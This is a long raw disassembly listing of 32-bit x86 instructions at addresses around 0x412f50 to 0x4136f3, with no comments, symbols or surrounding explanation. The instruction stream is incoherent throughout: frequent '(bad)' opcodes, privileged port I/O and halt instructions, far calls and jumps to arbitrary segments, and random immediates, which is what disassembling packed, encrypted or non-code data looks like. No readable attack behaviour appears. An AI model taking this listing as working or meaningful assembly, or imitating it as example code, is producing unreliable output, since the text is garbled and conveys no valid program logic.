  412f50:	ret    0xd960
  412f53:	dec    ebx
  412f54:	retf   0x250b
  412f57:	(bad)  
  412f58:	cld    
  412f59:	or     DWORD PTR [ecx-0x50],ecx
  412f5c:	mov    esi,DWORD PTR [edi+0x6d3618ca]
  412f62:	out    0xc3,al
  412f64:	mov    bl,0x42
  412f66:	cmp    ebp,DWORD PTR ds:0xdaf09173
  412f6c:	lods   eax,DWORD PTR ds:[esi]
  412f6d:	lods   al,BYTE PTR ds:[esi]
  412f6e:	mov    esi,0xdc1c680
  412f73:	sub    ebx,DWORD PTR [eax]
  412f75:	aaa    
  412f76:	jbe    0x412f91
  412f78:	mov    bh,0xae
  412f7a:	xchg   esi,eax
  412f7b:	je     0x412f29
  412f7d:	cmp    al,0xd0
  412f7f:	xchg   ebp,eax
  412f80:	or     DWORD PTR [edi-0x5c],edi
  412f83:	sbb    eax,0xbb107ef2
  412f88:	aas    
  412f89:	pop    esi
  412f8a:	test   BYTE PTR [ecx],ch
  412f8c:	dec    ebp
  412f8d:	push   esp
  412f8e:	and    al,0xa4
  412f90:	test   BYTE PTR [edx],al
  412f92:	mov    bh,0x8
  412f94:	and    al,0xbd
  412f96:	inc    ebx
  412f97:	hlt    
  412f98:	stc    
  412f99:	imul   eax,ebp,0xa484212d
  412f9f:	mov    eax,ds:0xbeab0c5e
  412fa4:	out    0x26,al
  412fa6:	sbb    DWORD PTR [eax+0x30],edx
  412fa9:	mov    dl,0xd3
  412fab:	jbe    0x412fdc
  412fad:	lods   eax,DWORD PTR ds:[esi]
  412fae:	(bad)  
  412faf:	fwait
  412fb0:	dec    ebp
  412fb1:	inc    ecx
  412fb2:	and    eax,0x3e52004c
  412fb7:	jle    0x412f99
  412fb9:	pusha  
  412fba:	xor    bl,BYTE PTR [edi]
  412fbc:	inc    esp
  412fbd:	jo     0x413024
  412fbf:	fwait
  412fc0:	out    0xe1,al
  412fc2:	call   0x9ff5e5d9
  412fc7:	adc    dl,0x8e
  412fca:	push   edi
  412fcb:	imul   ebx,DWORD PTR [ecx+0x83d52d3],0xffffffa7
  412fd2:	push   ss
  412fd3:	repnz or BYTE PTR [esi-0x26],bh
  412fd7:	popa   
  412fd8:	mov    ebp,0x5284e24e
  412fdd:	stos   DWORD PTR es:[edi],eax
  412fde:	mov    ds:0x9fa48d87,eax
  412fe3:	or     al,0xc7
  412fe5:	cmp    al,0x59
  412fe7:	cwde   
  412fe8:	add    al,0xd1
  412fea:	aas    
  412feb:	inc    eax
  412fec:	xchg   esp,eax
  412fed:	popa   
  412fee:	nop
  412fef:	std    
  412ff0:	sub    dh,dh
  412ff2:	dec    ebp
  412ff3:	and    BYTE PTR [esi],0xc0
  412ff6:	mov    esi,0x9d96ad47
  412ffb:	mov    ebp,0xe82e7741
  413000:	cmp    edi,eax
  413002:	stos   BYTE PTR es:[edi],al
  413003:	xchg   ecx,eax
  413004:	pop    ss
  413005:	rol    BYTE PTR [esi-0x2],1
  413008:	pop    edx
  413009:	inc    ecx
  41300a:	icebp  
  41300b:	rol    BYTE PTR [esi*4+0x79b4e737],1
  413012:	outs   dx,DWORD PTR ds:[esi]
  413013:	aas    
  413014:	adc    esi,esi
  413016:	mov    esp,esi
  413018:	inc    esi
  413019:	mov    al,ds:0x3bffea5
  41301e:	test   eax,0xf743779c
  413023:	out    0x7d,al
  413025:	push   ecx
  413026:	sub    eax,DWORD PTR [edx]
  413028:	sub    edi,edi
  41302a:	ds and eax,0x4a422823
  413030:	sub    edx,DWORD PTR [edi-0x75]
  413033:	xor    ch,BYTE PTR [ebx+ecx*2]
  413036:	push   esi
  413037:	inc    ebx
  413038:	loope  0x413073
  41303a:	and    al,BYTE PTR [eax-0x31]
  41303d:	pop    ebx
  41303e:	add    dl,dh
  413040:	pop    ds
  413041:	xchg   edi,eax
  413042:	call   0x4528:0x2493e137
  413049:	mov    eax,cs
  41304b:	rcr    BYTE PTR [esi+eiz*4-0x6b],1
  41304f:	mov    bh,0xd9
  413051:	std    
  413052:	xchg   edx,eax
  413053:	jb     0x412ff5
  413055:	adc    ebp,edx
  413057:	(bad)  
  413058:	aas    
  413059:	loop   0x412ffa
  41305b:	mov    cl,0xee
  41305d:	add    esi,DWORD PTR [ebx+eiz*1]
  413060:	cmp    edi,DWORD PTR [esi+ecx*8+0x48]
  413064:	ins    DWORD PTR es:[edi],dx
  413065:	fbld   TBYTE PTR [edi+0x70]
  413068:	adc    eax,DWORD PTR [ecx+ecx*8+0x2e]
  41306c:	adc    al,0x2a
  41306e:	scas   al,BYTE PTR es:[edi]
  41306f:	xchg   esi,eax
  413070:	push   edi
  413071:	xor    al,0xce
  413073:	test   dh,ah
  413075:	jns    0x41306c
  413077:	enter  0x8bc8,0x4a
  41307b:	lea    edx,[ecx-0x48]
  41307e:	sub    eax,0x4adf3732
  413083:	add    BYTE PTR [eax],al
  413085:	xlat   BYTE PTR ds:[ebx]
  413086:	test   eax,0xfe869482
  41308b:	mov    bh,0x22
  41308d:	mov    bl,0xf5
  41308f:	sbb    ah,BYTE PTR [ebp+ecx*8+0x1438a7ee]
  413096:	inc    ebx
  413097:	pop    esi
  413098:	mov    eax,0xe9a3114
  41309d:	loopne 0x4130c7
  41309f:	inc    ecx
  4130a0:	mov    ch,0x50
  4130a2:	mov    esp,0xc89b87be
  4130a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130a8:	jp     0x4130ca
  4130aa:	and    al,0x31
  4130ac:	clc    
  4130ad:	std    
  4130ae:	mov    al,ds:0x456e45fd
  4130b3:	rol    DWORD PTR [edi+0x27],0x50
  4130b7:	sbb    BYTE PTR ds:0xc0912cbd,al
  4130bd:	xor    al,0x70
  4130bf:	xor    BYTE PTR [eax],bl
  4130c1:	push   0x7827290b
  4130c6:	push   eax
  4130c7:	push   es
  4130c8:	call   0x7a8d:0xb5a840bd
  4130cf:	int3   
  4130d0:	dec    esp
  4130d1:	push   cs
  4130d2:	inc    ebx
  4130d3:	fist   DWORD PTR [edx-0x2f]
  4130d6:	mov    bl,0xe2
  4130d8:	icebp  
  4130d9:	ficom  DWORD PTR [edi+0x69]
  4130dc:	add    bl,dl
  4130de:	int    0x5a
  4130e0:	outs   dx,BYTE PTR ds:[esi]
  4130e1:	xchg   ecx,eax
  4130e2:	mov    ah,0x9b
  4130e4:	ja     0x4130b1
  4130e6:	mov    ch,0x27
  4130e8:	fisub  DWORD PTR [esi+0x39b39450]
  4130ee:	cli    
  4130ef:	cmp    al,0x48
  4130f1:	push   0x8acb120b
  4130f6:	cmc    
  4130f7:	lods   al,BYTE PTR ds:[esi]
  4130f8:	dec    ebp
  4130f9:	sbb    al,0xb5
  4130fb:	(bad)  
  4130fc:	adc    eax,0x58e39b8d
  413101:	in     al,dx
  413102:	test   ecx,esi
  413104:	ins    DWORD PTR es:[edi],dx
  413105:	adc    ecx,edx
  413107:	js     0x413137
  413109:	sbb    al,BYTE PTR [edx-0x3ec71430]
  41310f:	push   edx
  413110:	dec    esp
  413111:	test   al,0x37
  413113:	ret    
  413114:	cmp    eax,0x7141e30b
  413119:	mov    ah,ch
  41311b:	pop    edx
  41311c:	cmc    
  41311d:	and    eax,ebp
  41311f:	sbb    ah,dh
  413121:	popf   
  413122:	(bad)  
  413124:	pop    es
  413125:	fsubp  st(6),st
  413127:	(bad)  
  413128:	dec    eax
  413129:	(bad)  [ecx]
  41312b:	cmp    DWORD PTR [edi+edi*8+0x66],edx
  41312f:	push   es
  413130:	je     0x413137
  413132:	and    al,0xe8
  413134:	add    bh,BYTE PTR [ecx]
  413136:	add    al,0x14
  413138:	enter  0x7272,0x91
  41313c:	imul   BYTE PTR [edi+0x3f3da0f6]
  413142:	int3   
  413143:	loope  0x4131b2
  413145:	icebp  
  413146:	push   0xffffffdb
  413148:	test   eax,0x61f56491
  41314d:	enter  0xf093,0xe6
  413151:	aad    0x1c
  413153:	repz fisubr WORD PTR [ebx]
  413156:	jmp    FWORD PTR [esi+ecx*1-0x5d]
  41315a:	mov    ebx,0x827bced1
  41315f:	push   esp
  413160:	call   0x1ea6:0x1e35996f
  413167:	(bad)  
  413168:	std    
  413169:	or     BYTE PTR [ecx-0x194a9547],0x2b
  413170:	jecxz  0x4131a2
  413172:	mov    edi,?
  413174:	fidivr DWORD PTR [edi+0x34]
  413177:	cmp    esi,ebp
  413179:	cld    
  41317a:	hlt    
  41317b:	cmc    
  41317c:	loop   0x4131c0
  41317e:	mov    eax,ds:0xac19b3d4
  413183:	dec    ebx
  413184:	test   eax,0x1e3d48d6
  413189:	out    dx,eax
  41318a:	ret    
  41318b:	sbb    BYTE PTR [ecx+ebx*4],bh
  41318e:	lock add eax,0xfe36d81
  413194:	xchg   ebx,eax
  413195:	push   eax
  413196:	int    0xca
  413198:	(bad)  
  41319a:	out    dx,eax
  41319b:	adc    bh,BYTE PTR [ebp+0x4a1c204e]
  4131a1:	and    DWORD PTR [eax+0x1c40ba88],0xfffffff8
  4131a8:	les    ebx,FWORD PTR [esi]
  4131aa:	fucomi st,st(1)
  4131ac:	jle    0x41319c
  4131ae:	jmp    0x4131cc
  4131b0:	xor    al,BYTE PTR [edi]
  4131b2:	imul   edi
  4131b4:	mov    eax,ds:0xafdc8090
  4131b9:	jbe    0x4131a6
  4131bb:	out    0x2,eax
  4131bd:	cmp    esp,DWORD PTR [edi+esi*8+0x6e5f5886]
  4131c4:	xchg   ecx,eax
  4131c5:	int3   
  4131c6:	out    dx,al
  4131c7:	(bad)  
  4131c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131c9:	and    al,0x51
  4131cb:	inc    ebp
  4131cc:	xchg   esp,eax
  4131cd:	mov    eax,ds:0x687bed3f
  4131d2:	or     al,0x69
  4131d4:	retf   
  4131d5:	mov    ecx,0xfd3e7b60
  4131da:	pop    ebp
  4131db:	add    ecx,ebx
  4131dd:	xchg   ecx,eax
  4131de:	xor    al,0x7
  4131e0:	in     eax,dx
  4131e1:	imul   BYTE PTR [ebx]
  4131e3:	ror    ch,cl
  4131e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131e6:	adc    esp,DWORD PTR [eax]
  4131e8:	jo     0x4131b3
  4131ea:	inc    ebp
  4131eb:	cld    
  4131ec:	pop    esp
  4131ed:	jle    0x413211
  4131ef:	xor    dh,BYTE PTR ds:0x63baec33
  4131f5:	ins    DWORD PTR es:[edi],dx
  4131f6:	sub    DWORD PTR [ebx-0x35],0x2d
  4131fa:	pop    ebp
  4131fb:	mov    ch,0xca
  4131fd:	retf   
  4131fe:	cmp    eax,0xeb308b49
  413203:	sbb    BYTE PTR [ebx-0x36],bl
  413206:	enter  0x238c,0xd4
  41320a:	lock push edi
  41320c:	(bad)  
  41320d:	sahf   
  41320e:	sbb    BYTE PTR [edx+0xd],ah
  413211:	mov    ah,0xea
  413213:	mov    al,bh
  413215:	stc    
  413216:	popa   
  413217:	popf   
  413218:	loop   0x4131b2
  41321a:	sub    BYTE PTR [edx],0x38
  41321d:	jo     0x4131b2
  41321f:	dec    ecx
  413220:	popa   
  413221:	xchg   ebp,eax
  413222:	pop    ebx
  413223:	add    DWORD PTR ds:0x9f4c75f6,edx
  413229:	fnstenv [edx]
  41322b:	xchg   ebx,eax
  41322c:	xchg   BYTE PTR [eax],ch
  41322e:	(bad)  
  41322f:	xchg   ebp,eax
  413230:	xchg   esi,eax
  413231:	pop    ds
  413232:	sub    eax,0x77442322
  413237:	or     ah,BYTE PTR [eax]
  413239:	or     BYTE PTR [ebx],ch
  41323b:	or     edx,DWORD PTR [edi-0x4a]
  41323e:	xor    edi,DWORD PTR [edx+0x68f966ab]
  413244:	rcl    BYTE PTR [edi-0x47],cl
  413247:	iret   
  413248:	mov    ds:0x1fcecd2d,eax
  41324d:	cmc    
  41324e:	push   eax
  41324f:	sub    ebx,DWORD PTR [edi+0x78099427]
  413255:	xchg   esi,eax
  413256:	aam    0x9f
  413258:	mov    esi,0x85be4268
  41325d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41325e:	inc    esp
  41325f:	adc    eax,eax
  413261:	mov    cl,0x8e
  413263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413264:	adc    al,0xc0
  413266:	cmp    BYTE PTR [edi-0x28],dl
  413269:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41326a:	das    
  41326b:	push   cs
  41326c:	xchg   ebx,eax
  41326d:	dec    edx
  41326e:	pop    ds
  41326f:	retf   
  413270:	iret   
  413271:	mov    bl,0xc
  413273:	popa   
  413274:	jns    0x4132c7
  413276:	add    ebp,DWORD PTR [ecx]
  413278:	(bad)  
  413279:	or     al,0xf9
  41327b:	mov    es,WORD PTR [edx+0xb]
  41327e:	lods   eax,DWORD PTR ds:[esi]
  41327f:	pop    edx
  413280:	pop    ss
  413281:	push   eax
  413282:	div    DWORD PTR [ebp+0x66]
  413285:	hlt    
  413286:	scas   eax,DWORD PTR es:[edi]
  413287:	jo     0x41322c
  413289:	stos   DWORD PTR es:[edi],eax
  41328a:	fsub   DWORD PTR [ecx]
  41328c:	sub    DWORD PTR [ebx-0x67573236],edi
  413292:	lahf   
  413293:	es das 
  413295:	fidiv  WORD PTR [ebx-0x3a2155a]
  41329b:	not    esp
  41329d:	xchg   esp,eax
  41329e:	adc    cl,cl
  4132a0:	call   0xb05739f1
  4132a5:	out    0x15,eax
  4132a7:	cmp    cl,BYTE PTR [edi]
  4132a9:	pop    edi
  4132aa:	(bad)  
  4132ad:	xchg   edx,eax
  4132ae:	js     0x41324e
  4132b0:	pop    ebp
  4132b1:	data16 and bh,BYTE PTR [ebx+edi*1-0x2e]
  4132b6:	jns    0x41330a
  4132b8:	jmp    0x4132bc
  4132ba:	and    DWORD PTR [ebx+0x3a],ecx
  4132bd:	xor    DWORD PTR [ebx+eax*8-0x2666d541],esi
  4132c4:	bound  eax,QWORD PTR [edx+0x260471b0]
  4132ca:	inc    ebp
  4132cb:	dec    ebp
  4132cc:	xchg   BYTE PTR ds:0xf657b451,cl
  4132d2:	adc    DWORD PTR [edi+0x6c5fb5a],0xe6375f28
  4132dc:	es aaa 
  4132de:	je     0x413348
  4132e0:	and    al,ah
  4132e2:	mov    al,0x86
  4132e4:	shr    BYTE PTR [esi-0x75ccdb92],1
  4132ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132eb:	jle    0x4132ad
  4132ed:	sub    al,0x84
  4132ef:	pop    ebx
  4132f0:	add    DWORD PTR [eax+ebp*2],ebp
  4132f3:	add    DWORD PTR [ebx+0x5e],ebx
  4132f6:	scas   eax,DWORD PTR es:[edi]
  4132f7:	add    eax,0xef908993
  4132fc:	dec    esp
  4132fd:	cmc    
  4132fe:	out    dx,eax
  4132ff:	push   eax
  413300:	mov    ch,dl
  413302:	fdivp  st(3),st
  413304:	fcomp  DWORD PTR [ebp-0x16]
  413307:	out    dx,al
  413308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413309:	dec    ebx
  41330a:	add    BYTE PTR [ebp+0x6887a39],0x87
  413311:	scas   eax,DWORD PTR es:[edi]
  413312:	in     eax,dx
  413313:	and    ebx,DWORD PTR [ecx+0x841e897]
  413319:	inc    ecx
  41331a:	inc    ecx
  41331b:	addr16 jmp 0x2ca95b49
  413321:	cwde   
  413322:	adc    al,bh
  413324:	jae    0x413389
  413326:	mov    ch,0x90
  413328:	std    
  413329:	lods   eax,DWORD PTR ds:[esi]
  41332a:	neg    DWORD PTR [ecx-0x168135db]
  413330:	std    
  413331:	mov    cs:0x48021d9f,eax
  413337:	jns    0x4132fe
  413339:	fild   DWORD PTR [ebx-0x4d]
  41333c:	mov    bh,cl
  41333e:	aad    0x3d
  413340:	add    eax,0x84379d73
  413345:	adc    ecx,eax
  413347:	nop
  413348:	jmp    0x4132e7
  41334a:	inc    ebp
  41334b:	(bad)  
  41334c:	aam    0xdf
  41334e:	mov    si,0x7431
  413352:	fld    st(0)
  413354:	xor    eax,0x2673bb5c
  413359:	sub    dh,dl
  41335b:	push   ebp
  41335c:	mov    al,al
  41335e:	pop    ebx
  41335f:	fsub   QWORD PTR [ecx]
  413361:	es push ds
  413363:	cwde   
  413364:	ds popa 
  413366:	jbe    0x413378
  413368:	sub    DWORD PTR [ebx+0x33],ecx
  41336b:	pop    ebx
  41336c:	bound  esp,QWORD PTR [esi]
  41336e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41336f:	mov    esp,0xbfd83aea
  413374:	stc    
  413375:	out    dx,eax
  413376:	jo     0x4133e0
  413378:	xor    edi,DWORD PTR [ebp-0x29]
  41337b:	push   cs
  41337c:	lods   eax,DWORD PTR ds:[esi]
  41337d:	xor    edi,DWORD PTR [esi]
  41337f:	loope  0x413375
  413381:	push   ds
  413382:	cs jne 0x413381
  413385:	in     eax,dx
  413386:	mov    eax,0xd1146267
  41338b:	popf   
  41338c:	fnsetpm(287 only) 
  41338e:	rol    BYTE PTR [ebx+0x6bf95061],0xcf
  413395:	js     0x41334e
  413397:	mov    ebp,0x5dccb41
  41339c:	xchg   DWORD PTR [ecx-0x1e7dc91a],edx
  4133a2:	cmp    al,0xc4
  4133a4:	das    
  4133a5:	pop    edx
  4133a6:	out    dx,al
  4133a7:	mov    esp,0xa917eabf
  4133ac:	and    eax,DWORD PTR [edx]
  4133ae:	es mov esi,0xd4f20c9
  4133b4:	push   ss
  4133b5:	mov    ah,0xe8
  4133b7:	int    0xac
  4133b9:	dec    esp
  4133ba:	and    eax,0x9787beda
  4133bf:	and    ecx,ebx
  4133c1:	vunpckhps xmm3,xmm1,XMMWORD PTR [edi]
  4133c5:	or     al,dh
  4133c7:	xchg   edx,eax
  4133c8:	das    
  4133c9:	mov    ah,BYTE PTR [eax-0x50167b0c]
  4133cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133d0:	pusha  
  4133d1:	call   DWORD PTR [esi+ecx*2-0x56212102]
  4133d8:	pop    ebp
  4133d9:	pop    ebp
  4133da:	push   ecx
  4133db:	les    ecx,FWORD PTR [ebp-0x7c]
  4133de:	mov    BYTE PTR [esi],bh
  4133e0:	add    al,0x12
  4133e2:	sahf   
  4133e3:	imul   ebp,esi,0x77
  4133e6:	nop
  4133e7:	lods   al,BYTE PTR ds:[esi]
  4133e8:	inc    esi
  4133e9:	rcr    ebx,0x5a
  4133ec:	inc    ecx
  4133ed:	test   eax,0x458f31de
  4133f2:	ret    0xf3bd
  4133f5:	mov    eax,ds:0x246fdab7
  4133fa:	sub    dh,bl
  4133fc:	mov    dl,0xdd
  4133fe:	mov    esi,DWORD PTR [edx]
  413400:	es sbb eax,0x5211662a
  413406:	(bad)  
  413407:	ror    ch,0x4b
  41340a:	lods   al,BYTE PTR ds:[esi]
  41340b:	jle    0x4133fb
  41340d:	dec    ebp
  41340e:	sar    BYTE PTR [ebx-0x2e688572],0x8c
  413415:	xor    eax,0x78bb221f
  41341a:	retf   0x22d4
  41341d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41341e:	xchg   edx,eax
  41341f:	fcom   st(5)
  413421:	call   0xb0bc4bf3
  413426:	jmp    0x4e4b:0x57979f2
  41342d:	add    esi,ebx
  41342f:	arpl   WORD PTR [edx],ax
  413431:	pop    ebx
  413432:	popf   
  413433:	fwait
  413434:	inc    ebx
  413435:	cmp    eax,0xbecab170
  41343a:	jae    0x413403
  41343c:	imul   edi,DWORD PTR [esi+0x4c],0x768f7784
  413443:	icebp  
  413444:	int3   
  413445:	xor    BYTE PTR [edx],0xb0
  413448:	mov    bl,BYTE PTR [ebp+0x3d]
  41344b:	pop    edi
  41344c:	pop    esi
  41344d:	xchg   edi,eax
  41344e:	or     esi,DWORD PTR [esi-0x28c88a49]
  413454:	sbb    al,0x8d
  413456:	pop    ss
  413457:	add    esp,DWORD PTR [eax]
  413459:	shl    BYTE PTR [ebp+0x51025d09],1
  41345f:	aaa    
  413460:	imul   ebp,DWORD PTR [ebp+0x4c],0xffffff8b
  413464:	push   edi
  413465:	xchg   BYTE PTR [ecx+ebp*1-0x5b],ah
  413469:	ret    
  41346a:	mov    dh,0x8a
  41346c:	and    DWORD PTR [esp+eiz*8+0xc98a205],0xee76b818
  413477:	in     al,dx
  413478:	test   BYTE PTR [esi],al
  41347a:	in     al,0x53
  41347c:	or     DWORD PTR [eax+0x4a814369],edi
  413482:	fiadd  WORD PTR [edx-0x6a]
  413485:	jmp    0x4435:0x3a4c2de5
  41348c:	repz enter 0xed76,0x60
  413491:	pop    ss
  413492:	aaa    
  413493:	push   esi
  413494:	std    
  413495:	sbb    esp,DWORD PTR [ebp+0x430bbb90]
  41349b:	out    0x71,eax
  41349d:	clc    
  41349e:	sbb    al,0xa7
  4134a0:	xor    DWORD PTR ss:[bp+0x5a0],eax
  4134a6:	ja     0x41346b
  4134a8:	sbb    al,0xe7
  4134aa:	fidivr DWORD PTR [edx]
  4134ac:	push   esi
  4134ad:	inc    esp
  4134ae:	add    ecx,0x67
  4134b1:	jns    0x413478
  4134b3:	jnp    0x413480
  4134b5:	inc    edx
  4134b6:	nop
  4134b7:	aaa    
  4134b8:	aam    0x4b
  4134ba:	(bad)  
  4134bb:	adc    esi,DWORD PTR [eax+0x4bcb1b39]
  4134c1:	pop    ds
  4134c2:	pop    ds
  4134c3:	and    ah,al
  4134c5:	sub    esp,esp
  4134c7:	outs   dx,BYTE PTR ds:[esi]
  4134c8:	xor    eax,DWORD PTR [eax]
  4134ca:	cmp    BYTE PTR [eax],0x4b
  4134cd:	sar    bl,0xfc
  4134d0:	test   BYTE PTR [ebx-0x65f560b],bl
  4134d6:	sub    DWORD PTR [esp+eiz*4],ecx
  4134d9:	popf   
  4134da:	push   cs
  4134db:	mov    esi,0x31fc51ce
  4134e0:	push   es
  4134e1:	cmp    al,BYTE PTR [ecx-0x57]
  4134e4:	inc    eax
  4134e5:	div    BYTE PTR [edi-0x21e5ab74]
  4134eb:	mov    ebp,0xde3f8b4c
  4134f0:	push   eax
  4134f1:	mov    ecx,0x3d88f051
  4134f6:	push   es
  4134f7:	ins    BYTE PTR es:[edi],dx
  4134f8:	pop    esp
  4134f9:	pop    esp
  4134fa:	add    al,0xc8
  4134fc:	sar    DWORD PTR [ecx],0x83
  4134ff:	sahf   
  413500:	mov    ss,WORD PTR [edi+0x77]
  413503:	xchg   esi,eax
  413504:	mov    ecx,0xa50f4325
  413509:	pop    ds
  41350a:	xlat   BYTE PTR cs:[ebx]
  41350c:	mov    bh,0x9c
  41350e:	push   cs
  41350f:	dec    esi
  413510:	sti    
  413511:	dec    DWORD PTR [ebp+0x62a16bc]
  413517:	cmc    
  413518:	cmp    al,0x7b
  41351a:	lock retf 
  41351c:	push   eax
  41351d:	std    
  41351e:	inc    esp
  41351f:	mov    esi,0xfdfd251f
  413524:	xchg   edi,eax
  413525:	sbb    ah,BYTE PTR [eax-0x6191b08b]
  41352b:	je     0x413500
  41352d:	stos   DWORD PTR es:[edi],eax
  41352e:	js     0x413530
  413530:	(bad)  
  413531:	daa    
  413532:	inc    esi
  413533:	jg     0x4134c4
  413535:	pop    esi
  413536:	fistp  DWORD PTR [eax-0x6b]
  413539:	sbb    al,0xcc
  41353c:	jns    0x4135bc
  41353e:	stos   BYTE PTR es:[edi],al
  41353f:	pop    ebp
  413540:	mov    ds:0xec260f64,al
  413545:	push   ds
  413546:	push   ecx
  413547:	or     BYTE PTR [ecx+0x55],ch
  41354a:	mov    ecx,0x5dcb9b86
  41354f:	xchg   ecx,eax
  413550:	push   ax
  413552:	data16 adc al,0xb3
  413555:	jle    0x4134f7
  413557:	xor    al,0xb
  413559:	add    BYTE PTR [esi-0x4d],ch
  41355c:	pcmpgtb mm3,QWORD PTR [eax-0x1e]
  413560:	out    dx,eax
  413561:	push   cs
  413562:	call   0x6cd8:0xe4918361
  413569:	inc    edi
  41356a:	xchg   esi,eax
  41356b:	jp     0x413504
  41356d:	cmp    eax,0x72e62bf7
  413572:	push   edi
  413573:	inc    ecx
  413574:	ficom  DWORD PTR [eax-0x54910d0f]
  41357a:	adc    BYTE PTR [ebp+0x39daf959],bl
  413580:	gs js  0x4135a0
  413583:	adc    BYTE PTR [ecx],0x13
  413586:	jmp    FWORD PTR [ebp-0x10]
  413589:	nop
  41358a:	clc    
  41358b:	or     BYTE PTR [ebx],ch
  41358d:	adc    esp,DWORD PTR [esi]
  41358f:	jecxz  0x41357d
  413591:	jge    0x413543
  413593:	inc    DWORD PTR [ecx]
  413595:	repnz shl BYTE PTR [eax+0x33],0xf0
  41359a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41359b:	fistp  WORD PTR [eax]
  41359d:	cmp    BYTE PTR [esi+eiz*8-0x2e14e8a9],0xe4
  4135a5:	mov    ebp,0x597cb635
  4135aa:	xchg   ebx,eax
  4135ab:	mov    edi,DWORD PTR [edi+0x28]
  4135ae:	jmp    0xa499:0x2d33b1e6
  4135b5:	or     dl,bl
  4135b7:	sub    ch,bl
  4135b9:	mov    esi,0x8cabeaa0
  4135be:	pop    esi
  4135bf:	mov    eax,0x8b4255e1
  4135c4:	fistp  QWORD PTR [eax]
  4135c6:	hlt    
  4135c7:	in     al,dx
  4135c8:	outs   dx,DWORD PTR ds:[esi]
  4135c9:	jmp    0x4135f4
  4135cb:	es jns 0x413607
  4135ce:	cmp    DWORD PTR [edx+0x24],edx
  4135d1:	push   esp
  4135d2:	test   BYTE PTR [ebx],ch
  4135d4:	sub    DWORD PTR [ebp+0x75],0x5e
  4135d8:	cmp    DWORD PTR ds:0x306b6480,ebx
  4135de:	or     al,0x31
  4135e0:	inc    esi
  4135e1:	loope  0x413648
  4135e3:	fidivr DWORD PTR [ecx]
  4135e5:	fcomp  QWORD PTR [esi+esi*4-0x19]
  4135e9:	je     0x4135c9
  4135eb:	pop    edi
  4135ec:	pop    esi
  4135ed:	push   bp
  4135ef:	mov    dl,0xbb
  4135f1:	in     al,dx
  4135f2:	mov    eax,0xc52461c3
  4135f7:	xchg   DWORD PTR [edi],esi
  4135f9:	call   0xb338:0x4b079d98
  413600:	je     0x413631
  413602:	sbb    al,BYTE PTR [esi-0x39]
  413605:	out    dx,eax
  413606:	lds    esp,FWORD PTR [edi-0x2]
  413609:	mov    BYTE PTR [ecx-0x1e],0xcc
  41360d:	call   0xc8f51e9b
  413612:	into   
  413613:	xchg   edx,eax
  413614:	and    DWORD PTR [ecx],edx
  413616:	out    dx,eax
  413617:	dec    ebp
  413618:	add    cl,BYTE PTR [esi]
  41361a:	out    dx,eax
  41361b:	inc    eax
  41361c:	int3   
  41361d:	mov    edi,0x56143e0e
  413622:	pop    ebx
  413623:	and    esi,DWORD PTR [edi+0x66]
  413626:	mov    bh,0x95
  413628:	push   es
  413629:	push   ss
  41362a:	lods   al,BYTE PTR ds:[esi]
  41362b:	nop
  41362c:	(bad)  
  41362d:	sar    DWORD PTR [ebx],cl
  41362f:	sqrtps xmm5,XMMWORD PTR [ecx+0x564228f]
  413636:	iret   
  413637:	mov    esp,0x7e5ab989
  41363c:	fnsave [ecx-0x40]
  41363f:	bnd jo 0x413644
  413642:	lahf   
  413643:	cmp    al,0xf8
  413645:	call   0xbb66:0x6fcb8f95
  41364c:	pushf  
  41364d:	cmp    eax,0xf2a57e5f
  413652:	arpl   WORD PTR [esi-0x9],di
  413655:	pop    ecx
  413656:	mov    cs,WORD PTR [ebx+0x7624b4a5]
  41365c:	or     al,0x5
  41365e:	in     eax,0xf5
  413660:	sbb    BYTE PTR [eax+0xba55cb3],dh
  413666:	out    dx,eax
  413667:	mov    al,ds:0x9d980873
  41366c:	mov    bl,0xbd
  41366e:	ret    0x5d69
  413671:	and    BYTE PTR [edx],cl
  413673:	dec    edx
  413674:	mov    ah,0x48
  413676:	retfw  
  413678:	jnp    0x413610
  41367a:	inc    esp
  41367b:	push   esp
  41367c:	jbe    0x4136f5
  41367e:	mov    esp,0x6ad1a42b
  413683:	pop    ds
  413684:	std    
  413685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413686:	xchg   esp,eax
  413687:	mov    ah,BYTE PTR [eax]
  413689:	inc    edi
  41368a:	cld    
  41368b:	bound  esi,QWORD PTR [ecx+eax*2-0x209d7a78]
  413692:	push   ebp
  413693:	push   0x71
  413695:	dec    ecx
  413696:	out    0x33,al
  413698:	sub    eax,ebx
  41369a:	out    dx,al
  41369b:	cli    
  41369c:	out    0x27,al
  41369e:	daa    
  41369f:	mov    al,0x28
  4136a1:	arpl   sp,di
  4136a3:	cmp    BYTE PTR [ecx],0xd0
  4136a6:	(bad)  
  4136a7:	xor    eax,0x65c44ce9
  4136ac:	inc    eax
  4136ad:	push   ds
  4136ae:	adc    dh,cl
  4136b0:	aam    0xf4
  4136b2:	mov    al,BYTE PTR [edx-0x5d]
  4136b5:	int3   
  4136b6:	(bad)
  4136b9:	push   edx
  4136ba:	xor    DWORD PTR ds:0xd6899ee0,ebp
  4136c0:	fdiv   st(5),st
  4136c2:	and    esi,DWORD PTR [eax+0x14]
  4136c5:	mov    ecx,0xe2ef31dd
  4136ca:	fmul   st(4),st
  4136cc:	jae    0x413694
  4136ce:	jnp    0x413674
  4136d0:	cmp    BYTE PTR [esi-0xe7cbfb0],0x8
  4136d7:	hlt    
  4136d8:	(bad)  
  4136d9:	test   DWORD PTR [ebx+0x76],edi
  4136dc:	(bad)  
  4136de:	dec    DWORD PTR [eax+0x7504e878]
  4136e4:	or     BYTE PTR [esi+0x5e8b7f4b],ch
  4136ea:	fsubr  QWORD PTR [edi]
  4136ec:	fbld   TBYTE PTR ds:0xa103407e
  4136f2:	outs   dx,DWORD PTR ds:[esi]
  4136f3:	add    DWORD PTR [eax],esi
